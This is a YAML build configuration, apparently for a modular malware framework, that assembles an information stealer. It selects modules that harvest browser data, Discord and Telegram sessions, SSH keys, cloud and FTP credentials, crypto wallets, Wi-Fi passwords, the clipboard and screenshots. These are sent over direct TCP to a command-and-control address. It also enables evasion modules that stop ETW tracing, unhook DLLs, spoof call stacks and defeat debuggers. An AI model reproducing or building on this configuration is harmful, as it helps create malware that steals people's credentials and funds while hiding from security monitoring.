name: infostealer_minimal_iat
description: "Infostealer with API Set redirect for minimal IAT, SysWhispers3 egg-hunt syscalls, Morpheus threadpool sleep"

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/wifi_passwords
  - collectors/browser_chromium
  - collectors/discord_tokens
  - collectors/telegram_session
  - collectors/ftp_credentials
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/crypto_wallets
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/sequential
api_resolve: api_resolve/api_set_redirect
resources: true

evasion:
  - evasion/syswhispers3
  - evasion/sleep_morpheus
  - evasion/etw_session_stop
  - evasion/stack_spoof_synthetic
  - evasion/unhook_knowndlls
  - evasion/anti_debug_heap

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
